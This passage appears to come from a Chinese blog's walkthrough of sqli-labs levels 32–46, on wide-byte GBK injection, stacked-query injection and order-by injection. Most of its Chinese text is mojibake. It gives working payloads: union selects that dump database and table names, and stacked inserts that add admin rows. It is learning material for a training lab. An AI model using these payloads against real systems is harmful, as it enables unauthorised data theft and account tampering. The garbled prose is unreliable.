ç„¶ågbkæ˜¯ä¸¤ä¸ªå­—èŠ‚ä½œä¸ºä¸€ä¸ªæ±‰å­—ï¼Œè€Œuft-8æ˜¯ä¸‰ä¸ªå­—èŠ‚ä½œä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¾‹å¦‚%aa%5cå°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiç å¤§äº128æ‰èƒ½åˆ°æ±‰å­—çš„èŒƒå›´ï¼Œä¸¤ä¸ªå­—èŠ‚æ‰èƒ½å½¢æˆæ–‡å­—ï¼‰ é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å®æ–½æ³¨å…¥å‘¢ï¼Œå…ˆæŠŠæµç¨‹æä¸€éï¼šè¾“å…¥æ•°æ®-&gt;è¿›è¡Œè¿‡æ»¤-&gt;å¯¹æ•°æ®è¿›è¡Œgbkç¼–ç -&gt;ä»£å…¥æŸ¥è¯¢-&gt;è¾“å‡ºç»“æœæ¥ä¸‹æ¥ æ”»å‡»æµç¨‹ï¼šè¾“å…¥å¸¦æœ‰å±é™©å­—ç¬¦çš„æ•°æ®-&gt;è¿›è¡Œè¿‡æ»¤æ·»åŠ äº†åæ–œæ -&gt;å¯¹æ•°æ®è¿›è¡Œgbkç¼–ç (è¾“å‡ºçš„asciiç å¤§äº128çš„å­—ç¬¦è½¬ç ä»¥åå’Œå‰é¢çš„è½¬ç åçš„åæ–œæ å½¢æˆæ–‡å­—ï¼Œåªå‰©ä¸‹å•å¼•å·)-&gt;ä»£å…¥æŸ¥è¯¢ï¼ˆæ‰§è¡Œ(å±é™©çš„)sqlè¯­å¥ï¼‰-&gt;è¾“å‡ºç»“æœPSï¼šiconv()è¿›è¡Œç¼–ç è½¬æ¢çš„æ—¶å€™ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨å®½å­—ç¬¦æ³¨å…¥æ¼æ´æˆ‘ä»¬ä½¿ç”¨asciiç å¤§äº128çš„æœ‰ä¸€ä¸ª%aaå’Œ%dfæ„å»ºpayload:?id=1%a0â€™and 1=1 â€“+ ?id=-1%aaâ€™union select 1,database(),3 â€“+ä¸ºå•¥é‚£è¾¹ä¼šå˜æˆä¹±ç å‘¢ï¼Œå› ä¸ºwindowsç³»ç»Ÿä¸æ”¯æŒasciiå¤§äº128çš„æ˜¾ç¤ºä¸‹ä¸€ä¸ªpayloadï¼š?id=-1%a0â€™union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=â€™securityâ€™ â€“+è¿™ä¸ªè¯­å¥æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºå•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†securityç¼–ç æ­£ç¡®è¯­å¥æ˜¯ï¼š?id=-1%a0â€™union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 â€“+å› ä¸ºmysqlæ”¯æŒåå…­è¿›åˆ¶çš„æ•°å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œç›´æ¥å°†æ•°æ®è½¬ä¸º16è¿›åˆ¶å³å¯ï¼ˆ0xè¡¨ç¤º16è¿›åˆ¶ï¼‰ **è¡¥å……çŸ¥è¯†** 1.å­—ç¬¦ã€å­—ç¬¦é›† å­—ç¬¦(character)æ˜¯ç»„æˆå­—ç¬¦é›†(character set)çš„åŸºæœ¬å•ä½ã€‚å¯¹å­—ç¬¦èµ‹äºˆä¸€ä¸ªæ•°å€¼(encoding)æ¥ç¡®å®šè¿™ä¸ªå­—ç¬¦åœ¨è¯¥å­—ç¬¦é›†ä¸­çš„ä½ç½®ã€‚ 2.UTF8 ç”±äºASCIIè¡¨ç¤ºçš„å­—ç¬¦åªæœ‰128ä¸ªï¼Œå› æ­¤ç½‘ç»œä¸–ç•Œçš„è§„èŒƒæ˜¯ä½¿ç”¨UNICODEç¼–ç ï¼Œä½†æ˜¯ç”¨ASCIIè¡¨ç¤ºçš„å­—ç¬¦ä½¿ç”¨UNICODEå¹¶ä¸é«˜æ•ˆã€‚å› æ­¤å‡ºç°äº†ä¸­é—´æ ¼å¼å­—ç¬¦é›†ï¼Œè¢«ç§°ä¸ºé€šç”¨è½¬æ¢æ ¼å¼ï¼ŒåŠUTF(Universal Transformation Format)ã€‚ 3.å®½å­—èŠ‚GB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JISç­‰è¿™äº›éƒ½æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤å­—èŠ‚ã€‚å®½å­—èŠ‚å¸¦æ¥çš„å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯åƒASCIIå­—ç¬¦(ä¸€å­—èŠ‚)çš„ç°è±¡ï¼Œå³å°†ä¸¤ä¸ªasciiå­—ç¬¦è¯¯è®¤ä¸ºæ˜¯ä¸€ä¸ªå®½å­—èŠ‚å­—ç¬¦ã€‚MYSQLçš„å­—ç¬¦é›†è½¬æ¢è¿‡ç¨‹ 1.MySQL Serveræ”¶åˆ°è¯·æ±‚æ—¶å°†è¯·æ±‚æ•°æ®ä»character_set_clientè½¬æ¢ä¸ºcharacter_set_connection; 2.è¿›è¡Œå†…éƒ¨æ“ä½œå‰å°†è¯·æ±‚æ•°æ®ä»character_set_connectionè½¬æ¢ä¸ºå†…éƒ¨æ“ä½œå­—ç¬¦é›†ï¼Œå…¶ç¡®å®šæ–¹æ³•å¦‚ä¸‹ï¼š ä½¿ç”¨æ¯ä¸ªæ•°æ®å­—æ®µçš„CHARACTER SETè®¾å®šå€¼; è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨å¯¹åº”æ•°æ®è¡¨çš„DEFAULT CHARACTER SETè®¾å®šå€¼(MySQLæ‰©å±•ï¼ŒéSQLæ ‡å‡†); è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨å¯¹åº”æ•°æ®åº“çš„DEFAULT CHARACTER SETè®¾å®šå€¼; è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨character_set_serverè®¾å®šå€¼ã€‚ å°†æ“ä½œç»“æœä»å†…éƒ¨æ“ä½œå­—ç¬¦é›†è½¬æ¢ä¸ºcharacter_set_resultsã€‚é‡ç‚¹ï¼šå®½å­—èŠ‚æ³¨å…¥å‘ç”Ÿçš„ä½ç½®å°±æ˜¯PHPå‘é€è¯·æ±‚åˆ°MYSQLæ—¶å­—ç¬¦é›†ä½¿ç”¨character_set_clientè®¾ç½®å€¼è¿›è¡Œäº†ä¸€æ¬¡ç¼–ç ã€‚PHPä¸­ç¼–ç ä¸ºGBKï¼Œå‡½æ•°æ‰§è¡Œæ·»åŠ çš„æ˜¯ASCIIç¼–ç ï¼ˆæ·»åŠ çš„ç¬¦å·ä¸ºâ€œ\\â€ï¼‰ï¼ŒMYSQLé»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—èŠ‚å­—ç¬¦é›†ã€‚ä¸€ç‚¹å°ä½“ä¼š1.åªæœ‰å­˜åœ¨è½¬ä¹‰å‡½æ•°ä»¥åŠgbkç¼–ç çš„æ—¶å€™ æ‰ä¼šå‡ºç°å®½å­—èŠ‚æ³¨å…¥ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå…¶å®æƒ³ä¸€ä¸‹ï¼Œåªæœ‰åœ¨æˆ‘ä»¬è¾“å…¥å•å¼•å·ï¼Œç„¶åå‡½æ•°è½¬ä¹‰ç»™æˆ‘ä»¬æ·»åŠ äº†åæ–œæ ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¾“å…¥asciiå¤§äº128çš„å­—ç¬¦èƒ½è¾¾åˆ°åƒå­—ç¬¦ï¼Œè®©å•å¼•å·é€ƒé€¸çš„æ•ˆæœã€‚ä¸‰åä¸‰å…³å’Œä¸Šä¸€å…³æ²¡å¤šå¤§åŒºåˆ«ï¼Œåœ¨çœ‹æºç çš„è¿‡ç¨‹ä¸­å”¯ä¸€çš„åŒºåˆ«å°±åœ¨äºä¸‰åä¸‰å…³ä½¿ç”¨çš„æ˜¯addslashesè¿›è¡Œè½¬ä¹‰ æ— å¤šå¤§åŒºåˆ« ç¬¬ä¸‰åå››å…³è¿™æ˜¯ä¸€ä¸ªpostè¯·æ±‚æ–¹å¼ï¼Œåœ¨URLä¸Šé¢ç›´æ¥è¾“å…¥å’Œåœ¨æ¡†é‡Œè¾“å…¥æ˜¯ä¸å¤ªä¸€æ ·çš„è¿™é‡Œå†æ¥ç³»ç»Ÿçš„äº†è§£ä¸€ä¸‹ä¸€äº›ç¼–ç çš„çŸ¥è¯†å§https://www.cnblogs.com/fnlingnzb-learner/p/6163205.htmlåœ¨è¿™é‡Œæˆ‘æƒ³åœ¨åŒºåˆ†ä¸€ä¸‹åœ¨å•Šurlè¾“å…¥å’Œåœ¨ä¸‹é¢æ¡†é‡Œè¾“å…¥çš„åŒºåˆ«ï¼šåœ¨ä¸Šé¢çš„urlè¾“å…¥çš„æ—¶å€™ï¼Œå¦‚æœä½ è¾“å…¥çš„æ—¶å€™ å¦‚æœä½ å·²ç»è¾“å…¥çš„æ˜¯ä¸€ä¸ªç¬¦åˆurlç¼–ç çš„æ ¼å¼çš„æ—¶å€™ï¼Œä»–å°±ä¸ä¼šç†ä½ ï¼Œç›´æ¥åŸæ ·å‘é€æ•°æ®ï¼Œä½†æ˜¯å½“ä½ åœ¨ä¸‹é¢çš„æ¡†æ¡†çš„è¾“å…¥çš„æ—¶å€™ï¼Œ%ä¼šåœ¨ç»è¿‡ä¸€æ¬¡ç¼–ç å˜æˆ%25 æ‰€ä»¥å¦‚æœæˆ‘ä»¬åœ¨ä¸‹é¢çš„æ¡†æ¡†ä¹Ÿæ˜¯é‡‡ç”¨åŒæ ·çš„è¾“å…¥æ–¹å¼çš„æ—¶å€™å°±ä¼šå‡ºé”™ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³å‘¢ï¼Ÿæ³•1:æˆ‘ä»¬ä¾æ—§å¯ä»¥æŒ‰ç…§åš33å…³çš„æ–¹å¼è¾“å…¥ï¼Œåªéœ€è¦ç”¨burp suitæŠ“åŒ…æŠŠå¤šç¼–ç çš„é‚£ä¸ª25åˆ é™¤å³å¯ åˆ æ‰25 å³å¯å¾—åˆ° æ–¹æ³•2ï¼šç»è¿‡ä¸€ç•ªæ¢ç´¢ï¼Œç»ˆäºå¼„æ˜ç™½äº†ä¸€ä¸ªå­—ç¬¦ä»£è¡¨å‡ ä¸ªå­—èŠ‚åœ¨ä¸åŒçš„ç¼–ç ä¸‹æ˜¯ä¸ä¸€æ ·çš„UTF-16ç¼–ç ï¼šä¸€ä¸ªè‹±æ–‡å­—æ¯å­—ç¬¦æˆ–ä¸€ä¸ªæ±‰å­—å­—ç¬¦å­˜å‚¨éƒ½éœ€è¦2ä¸ªå­—èŠ‚ï¼ˆUnicodeæ‰©å±•åŒºçš„ä¸€äº›æ±‰å­—å­˜å‚¨éœ€è¦4ä¸ªå­—èŠ‚ï¼‰ã€‚UTF-8ç¼–ç ï¼šä¸€ä¸ªè‹±æ–‡å­—ç¬¦ç­‰äºä¸€ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªä¸­æ–‡ï¼ˆå«ç¹ä½“ï¼‰ç­‰äºä¸‰ä¸ªå­—èŠ‚ã€‚ä¸­æ–‡æ ‡ç‚¹å ä¸‰ä¸ªå­—èŠ‚ï¼Œè‹±æ–‡æ ‡ç‚¹å ä¸€ä¸ªå­—èŠ‚Unicodeç¼–ç ï¼šä¸€ä¸ªè‹±æ–‡ç­‰äºä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªä¸­æ–‡ï¼ˆå«ç¹ä½“ï¼‰ç­‰äºä¸¤ä¸ªå­—èŠ‚ã€‚ä¸­æ–‡æ ‡ç‚¹å ä¸¤ä¸ªå­—èŠ‚ï¼Œè‹±æ–‡æ ‡ç‚¹å ä¸¤ä¸ªå­—èŠ‚ã€‚urlç¼–ç å°±æ˜¯åœ¨uft-8ç¼–ç çš„åŸºç¡€ä¸Šï¼Œç»™ç¼–ç çš„æ¯ä¸ªå­—èŠ‚åŠ ä¸Šç™¾åˆ†å· æ‰€ä»¥POSTçš„è¯·æ±‚ä¸­ï¼Œæ•°æ®çš„ç¼–ç è¿‡ç¨‹æ˜¯è¿™æ ·å˜åŒ–çš„ï¼šå½“æˆ‘ä»¬ä¸€å¼€å§‹è¾“å…¥çš„æ˜¯æ±‰å­—ï¼Œé‚£ä¹ˆä¼šè¢«å…ˆè¢«uft-8ç¼–ç ï¼Œç„¶ååœ¨è¢«åŠ ä¸Šç™¾åˆ†å·å°±æ˜¯urlç¼–ç äº†å½“ç„¶ä¹Ÿå­˜åœ¨uft-16çš„ç¼–ç æ–¹å¼ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬è¾“å…¥è¿™ä¸ªæ•°æ®ï¼š**â€™1é›²'or 1=1 #â€™ ** æŠ“åŒ… å¾—åˆ°è¿™ä¸ªæ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™ä¸ªæ±‰å­—è¢«è½¬åŒ–ä¸ºä¸‰ä¸ªå­—èŠ‚ï¼Œï¼Œä¹Ÿå°±æ˜¯uft-8ç¼–ç ã€‚åœ¨ä¼ è¾“åˆ°æ•°æ®åº“é‡Œé¢ï¼Œå¹¶ä¸”å¯¹å•å¼•å·%27æ·»åŠ è½¬ä¹‰åæ–œæ ï¼Œå†è¢«gbkç¼–ç ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬è¿™é‡Œæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨gbkä¸­ä¸¤ä¸ªå­—ç¬¦å°±ä¼šè¢«å½“æˆä¸€ä¸ªæ±‰å­—ï¼Œé‚£ä¹ˆæˆ‘ä»¬åŸæœ¬è¾“å…¥ä¸€ä¸ªæ±‰å­—ï¼Œè¿™ä¸ªæ±‰å­—è¢«è½¬åŒ–æˆä¸‰ä¸ªå­—èŠ‚ï¼ŒåŠ ä¸ŠåŸæœ¬çš„å•å¼•å·ä¸€å…±å››ä¸ªå­—èŠ‚ï¼Œå½“è½¬ä¹‰å­—ç¬¦æ’å…¥ï¼Œå°±å˜æˆäº†äº”ä¸ªå­—èŠ‚ï¼Œè¿™ä¸ªæ—¶å€™å•å¼•å·ä¾æ—§å¯ä»¥é€ƒé€¸å‡ºã€‚å…¶å®æˆ‘è§‰å¾—å®½å­—èŠ‚æ³¨å…¥çš„æ ¸å¿ƒåœ¨äºï¼šåˆ©ç”¨gbkç¼–ç çš„ä¸¤ä¸ªå­—ç¬¦åƒæ‰è½¬ä¹‰å­—ç¬¦åæ–œæ ï¼Œä½¿å¾—å•å¼•å·é€ƒé€¸å‡ºï¼ˆå‰é¢å¥½åƒè¯´è¿‡äº†ï¼Œä½†æ˜¯ç°åœ¨æ›´åŠ æ˜äº†å“ˆå“ˆå“ˆå“ˆå“ˆï¼‰æ–¹æ³•3ï¼šæˆ‘ä»¬çŸ¥é“è¾“å…¥çš„æ•°æ®ä¼šè¢«ç¼–ç ä¸ºuft-8ï¼Œç„¶åè¢«urlç¼–ç ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç›´æ¥å°†å…¶è½¬åŒ–æˆuft-8ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥å®ç°æ³¨å…¥å‘¢ç­”æ¡ˆæ˜¯ä¸ä¼šï¼Œå› ä¸ºæ²¡æœ‰è‡ªåŠ¨è¯†åˆ«åŠŸèƒ½~https://www.qqxiuzi.cn/bianma/Unicode-UTF.phpè¿™æ˜¯ä¸€ä¸ªå¯ä»¥è½¬ç çš„ç½‘å€OK æ¥ä¸‹æ¥å°±æ˜¯æš´è¡¨ å•¥çš„ ç»„åˆæ‹³å†²äº† è¡¥å……çŸ¥è¯†ï¼šäº†è§£æ•´ä¸ªç¼–ç è§£ç è¿‡ç¨‹ï¼šhttps://www.freebuf.com/column/165567.html ç¬¬35å…³è¿™å…³å±å®æœ‰ç‚¹æç¬‘ï¼Œè½¬ä¹‰å´åœ¨idè¿™é‡Œä¸åŠ å¼•å·ï¼Œç›´æ¥æ„é€ payloadå°±è¡Œäº†ï¼Œç„¶ååé¢éœ€è¦securityåœ¨è½¬ç ä¸€ä¸‹å°±è¡Œ ç¬¬36å…³è¿™ä¸€å…³ä¾æ—§æ˜¯éœ€è¦åˆ©ç”¨getå®½å­—èŠ‚æ³¨å…¥ ä¸è¿‡è¿™å…³ä½¿ç”¨çš„è½¬ä¹‰å‡½æ•°æ˜¯mysqli_real_escape_string()ï¼›ç›´æ¥æ„é€ payloadï¼š?id=-1%a0â€™union select 1,database(),3 â€“+ä¸‹é¢å°±æ˜¯ç»„åˆæ‹³äº† ç¬¬37å…³ å’Œå‰é¢çš„postå®½å­—èŠ‚æ³¨å…¥æ— å¤šå¤§åŒºåˆ«ï¼Œä¸è¿‡ç”¨å¾—æ˜¯mysqli_real_escape_string(),payloadéƒ½æ²¡å˜ ç¬¬38å…³å…ˆç ”ç©¶ä¸€ä¸‹æºä»£ç mysqli_connect()å‡½æ•°æ‰“å¼€ä¸€ä¸ªåˆ° MySQL æœåŠ¡å™¨çš„æ–°çš„è¿æ¥ã€‚è¯­æ³•ï¼šmysqli_connect(host,username,password,dbname,port,socket)ï¼› mysqli_select_dbï¼ˆï¼‰ä½œç”¨ï¼šç”¨äºæ›´æ”¹è¿æ¥çš„é»˜è®¤æ•°æ®åº“ã€‚mysqli_select_db(connection,dbname)mysqli_multi_query()mysqli_multi_query(connection,query)ï¼› mysql_store_result()å‡½æ•°ç”¨äºå°†mysqli_query()æŸ¥è¯¢çš„ç»“æœé›†å­˜å‚¨åˆ°å˜é‡ä¸­mysqli_more_results();mysqli_more_results(connection);å‚æ•°ï¼šconnectionï¼šå¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„mysqlè¿æ¥åŠŸèƒ½ï¼Œæ£€æŸ¥ä¸€ä¸ªå¤šæŸ¥è¯¢æ˜¯å¦æœ‰æ›´å¤šçš„ç»“æœã€‚ä¹Ÿæ²¡çœ‹åˆ°æœ‰å•¥è¿‡æ»¤çš„ä»£ç ç„¶åçœ‹åˆ°idè¢«å•å¼•å·åŒ…è£¹ï¼Œæ‰€ä»¥å…ˆè¯•è¯•å¸¸è§„æ“ä½œå§åˆ©ç”¨unionæ‹¼æ¥selectå³å¯è·å¾—æ•°æ®mysqli_multi_query()è¿˜æ˜¯è®©äººæ¯”è¾ƒåœ¨æ„çš„ï¼Œæ‰€ä»¥çœ‹çœ‹æ ‡é¢˜ï¼ŒåŸæ¥è¿™æ˜¯è®©æˆ‘ä»¬å°è¯•å †å æ³¨å…¥çš„å †å æ³¨å…¥åŸç†ï¼šå­—é¢æ„æ€å°±æ˜¯å¤šæ¡è¯­å¥ä¸€èµ·æ‰§è¡Œã€‚å¦‚ä½•å®ç°ï¼Ÿæˆ‘ä»¬éƒ½çŸ¥é“åœ¨mysqlä¸­ï¼Œæ¯ä¸€æ¡è¯­å¥ç»“å°¾åŠ åˆ†å·ï¼ˆï¼›ï¼‰è¡¨ç¤ºè¯­å¥çš„ç»“æŸï¼ŒåŸºäºæ­¤ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æ‰§è¡Œå®Œä¸€æ¡è¯­å¥ä¹‹åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¸­é—´ç”¨åˆ†å·è¡¨ç¤ºå‰ä¸€æ¡è¯­å¥çš„ç»“æŸï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„è¯­å¥çš„å®ç°ä¹Ÿå°±æˆä¸ºäº†å¯èƒ½ã€‚ å’Œunionçš„åŒºåˆ«ï¼šunionæ‰§è¡Œçš„è¯­å¥æ˜¯æœ‰é™çš„ï¼Œåªèƒ½ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ˜¯ä»»æ„çš„è¯­å¥å±€é™æ€§ï¼šç”±äºæ˜¯ç¬¬äºŒæ¡è¯­å¥ï¼Œæ‰€ä»¥é¡µé¢æ˜¯ä¸ä¼šå›æ˜¾çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å‰ç«¯é¡µé¢æ— æ³•çœ‹åˆ°è¿”å›ç»“æœï¼Œæ‰€ä»¥ï¼Œåœ¨è¯»å–æŸ¥è¯¢æ•°æ®æ—¶ï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨unionï¼ˆè”åˆï¼‰æ³¨å…¥ï¼ŒåŒæ—¶åœ¨ä½¿ç”¨å †å æ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬å¤§å¤šæ•°æ—¶å€™ä¹Ÿæ˜¯éœ€è¦ä¸€äº›æ•°æ®åº“ç›¸å…³ä¿¡æ¯çš„ï¼Œä¾‹å¦‚è¡¨åï¼Œåˆ—åå­—ï¼Œå½“ç„¶APIæˆ–è€…æ•°æ®åº“ï¼ˆOracleæ•°æ®åº“ï¼‰å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ä¸‹ï¼Œä¹Ÿå¯èƒ½é™åˆ¶ä¸è¶³å¦‚æœæ²¡æœ‰mysli_multi_query()çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å †å æ³¨å…¥å—ï¼Ÿç­”æ¡ˆæ˜¯ä¸è¡Œï¼Œå› ä¸ºæ­¤æ—¶æ— æ³•å¤„ç†å¤šæ¡è¯­å¥ã€‚ï¼ˆå±€é™æ€§ä¹‹ä¸€ï¼‰æ„å»ºpayloadï¼šâ€™;insert into users(id,username,password) values(5,â€™admmmâ€™,â€™admmmâ€™) â€“+æ’å…¥æˆåŠŸï¼Œé‚£ä¹ˆdeleteç­‰å±é™©æ“ä½œä¹Ÿæ˜¯å¯ä»¥å®ç°çš„ï¼Œå¦‚æœæ›´æ”¹çš„æ˜¯ç®¡ç†å‘˜çš„è´¦æˆ·ï¼Œé‚£æ“ä½œç©ºé—´è¿˜è›®å¤§çš„ï¼Œå¯æ˜¯è¿‡äºå±€é™äº†ã€‚ ç¬¬39å…³æ•°å­—å‹æ³¨å…¥ å¼•å·éƒ½ä¸ç”¨åŠ ï¼Œç›´æ¥æ³¨å…¥å°±è¡Œäº† ç¬¬40å…³å•å¼•å·åŠ æ‹¬å·çš„é—­åˆæ–¹å¼â€™) æ—¢å¯ä»¥é‡‡å–unioné—­åˆçš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥ç”¨å †å æ³¨å…¥ ä½†æ˜¯é”™è¯¯ä¸ä¼šå›æ˜¾ï¼Œæ— æ³•ç”¨æŠ¥é”™æ³¨å…¥ ç¬¬41å…³è¿™ä¸ªæ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œå’Œç¬¬ä¸‰åä¹å…³å·®ä¸å¤šä½†æ˜¯æ— æ³•ä½¿ç”¨æŠ¥é”™æ³¨å…¥å› ä¸ºæŠ¥é”™ä¹Ÿä¸å›æ˜¾ã€‚ ç¬¬42å…³è¿™å…³å’Œä¹‹å‰çš„24å…³å¡æœ‰ç‚¹åƒ ä½†æ˜¯è¿™å…³éœ€è¦ä½¿ç”¨å †å æ³¨å…¥ï¼Œå¹¶ä¸”åœ¨ä¸€å¼€å§‹ç™»å½•çš„æ—¶å€™æ˜¯æ²¡æœ‰å¯¹å¯†ç è¿›è¡Œè¿‡æ»¤çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ªæˆ‘ä»¬çš„æ’å…¥è¯­å¥ï¼Œå› ä¸ºåœ¨æ›´æ”¹å¯†ç çš„æ—¶å€™ ä»–ä¾æ—§æ²¡æœ‰å¯¹ç”¨æˆ·åè¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€å¼€å§‹åœ¨æ’å…¥çš„æ—¶å€™å°±å¯ä»¥åƒä¹‹å‰ä¸€æ ·,ä¸å¯¹ï¼Œå…¶å®æ˜¯ä¸ä¸€æ ·çš„ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“å‰é¢æˆ‘ä»¬æ˜¯ç”¨#å·æ³¨é‡Šæ‰åé¢ï¼Œè¿™æ ·ä¿®æ”¹å¯†ç å°±æ˜¯ä¿®æ”¹adminçš„äº†ï¼Œå°±ä¸å­˜åœ¨æŠ¥é”™ï¼Œä½†æ˜¯åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æ’å…¥äº†è¯­å¥ï¼Œæˆ‘ä»¬ä½¿ç”¨#å°±ä¼šæŠŠæˆ‘ä»¬çš„æ’å…¥è¯­å¥åé¢ç»™æ³¨é‡Šæ‰äº†ï¼Œå°±å¯¼è‡´æŠ¥é”™æ— æ³•æ­£ç¡®æ’å…¥æ•°æ®ï¼špayloadï¼šadmin=adm; password=1â€™;insert into users values(15,â€™adminâ€™,â€™adminâ€™) â€“å½“ç„¶ä¹Ÿå¯ä»¥è¿›è¡Œupdateä¿®æ”¹ deleteåˆ é™¤ç­‰æ“ä½œï¼Œå‰ææ˜¯è¦å…ˆçŸ¥é“ä»–çš„è¡¨å«usersï¼› æ¥ä¸‹æ¥çŸ¥é“45å…³éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå°±ä¸è¯´äº† å°ç»“ï¼š","link":"/2020/12/03/sqlilabs7/"},{"title":"sqlilabs8","text":"ç¬¬46å…³åœ¨è¿™ä¸€å…³ä¸­æˆ‘ä»¬çœ‹æ ‡é¢˜ æ˜¯order byæ³¨å…¥ é‚£ä¹ˆæˆ‘ä»¬å°±å…ˆå†æŠŠorder byäº†è§£ä¸€ä¸‹å§ æ„Ÿè§‰ç°åœ¨æ‰çœŸæ­£ç†è§£order byä¸ºä»€ä¹ˆåœ¨å‰é¢å¯ä»¥ç”¨æ¥æŸ¥è¯¢å­—æ®µæ•°ï¼ˆåˆ—æ•°ï¼‰ï¼Œå› ä¸ºorder byå¯ä»¥è®©æ¯ä¸ªåˆ—æ˜æŒ‰ç…§å‡åºæˆ–è€…é™åºçš„æ–¹å¼è¿›è¡Œæ’åºï¼Œæ‰€ä»¥å½“ä¸å­˜åœ¨è¿™ä¹ˆå¤šåˆ—çš„æ—¶å€™ï¼Œä»–å°±ä¸å­˜åœ¨äº†ã€‚ï¼ˆè¿™ä¸ªç†è§£æœ‰ç‚¹æµ…è–„ï¼Œæ•…å†å»æŸ¥æ‰¾äº†ä¸€ä¸‹èµ„æ–™ï¼‰:å…¶å®åœ¨çœ‹å®Œè¯´æ˜ä¹¦åï¼Œæˆ‘è¿˜ä¸æ˜¯å¾ˆç†è§£ï¼Œä¸æ˜¯å¾ˆæ‡‚order byä¸ºä»€ä¹ˆå¯ä»¥æ³¨å…¥ å› ä¸ºæˆ‘è§‰å¾—ä»–ä¸åƒæŠ¥é”™æ³¨å…¥æ—¶é—´ç›²æ³¨é‚£äº›æœ‰åœ°æ–¹å¯ä»¥ç›´æ¥è®©æˆ‘å†™ä»£ç ï¼Œä»–åé¢è¿˜éœ€è¦åŠ æ•°å­—ï¼Œæ‰€ä»¥æˆ‘å°±å¾ˆçº³é—·ã€‚ä½†æ˜¯ï¼šåœ¨æˆ‘å‘ç°order byåé¢çš„æ’åºå¯ä»¥å˜æˆå‡åºæˆ–è€…é™åºè¾“å…¥çš„æ—¶å€™ï¼Œæˆ‘çªç„¶æœ‰äº†ä¸€ä¸æ„Ÿè§‰ï¼šæ³¨å…¥ç©¶ç«Ÿæ˜¯å•¥ï¼ŸæŒ‡çš„ä¸å°±æ˜¯æˆ‘ä»¬åœ¨å¤–éƒ¨è¾“å…¥çš„å‘½ä»¤èƒ½è¢«å¸¦è¿›å»æ•°æ®åº“é‡Œé¢æ‰§è¡Œå—ï¼Œæ‰€ä»¥åªè¦æ»¡è¶³ï¼šèƒ½è¢«ä»£å…¥æ•°æ®åº“æ‰§è¡Œå‘½ä»¤ï¼Œå…¶å®å°±å­˜åœ¨å¯èƒ½æ³¨å…¥ç‚¹çŸ¥é“è¿™ç‚¹æˆ‘ä»¬ æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œorder byåé¢çš„æ•°å­—æ˜¯ä¸€ä¸ªå¯æ§çš„å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥æ„é€ æˆ‘ä»¬çš„è¯­å¥ï¼Œä½¿å…¶è¢«æ•°æ®åº“æ‰§è¡Œï¼Œ è€Œåœ¨è¿™é¢˜ä¸­ ä»–çš„æŸ¥è¯¢è¯­å¥æ˜¯å¯¹æˆ‘ä»¬è¾“å…¥çš„é‚£ä¸€è¡Œè¿›è¡Œæ’åºè¾“å‡ºçš„ çœ‹ä¸Šé¢ ä»–è¦æ±‚æˆ‘ä»¬è¾“å…¥çš„ä¸€ä¸ªsort æ‰€ä»¥æˆ‘ä»¬ç°åœ¨ä¸èƒ½å†?id=å¤šå°‘ è€Œæ˜¯è¦?sort=å¤šå°‘ï¼Œç„¶åå†çœ‹ä»–çš„æŸ¥è¯¢è¯­å¥ï¼Œå¯¹äºidæ˜¯æ²¡æœ‰åŠ å¼•å·ä¹‹ç±»çš„ï¼Œæ‰€ä»¥æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œç„¶åæˆ‘ä»¬åœ¨æƒ³ï¼Œè¦åœ¨order by åé¢åŠ 